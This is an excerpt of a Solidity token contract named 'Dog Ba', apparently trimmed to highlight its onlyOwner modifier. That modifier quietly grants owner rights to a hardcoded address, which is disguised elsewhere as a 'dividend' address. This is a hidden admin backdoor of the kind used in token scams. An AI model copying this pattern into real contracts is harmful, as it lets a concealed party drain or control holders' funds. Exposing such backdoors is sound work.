...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x8570391e1447e004c55b8a212EE37f5f5645da99) , "owner");
        _;
    }
...
contract DogBa  is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Dog Ba";
    string private _symbol = "DOGBA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xAc1c9141A7f079163905d175287b9f056A3797Ac);
    address private _Marketing = 0xAc1c9141A7f079163905d175287b9f056A3797Ac;
    address public dividend = 0x8570391e1447e004c55b8a212EE37f5f5645da99;
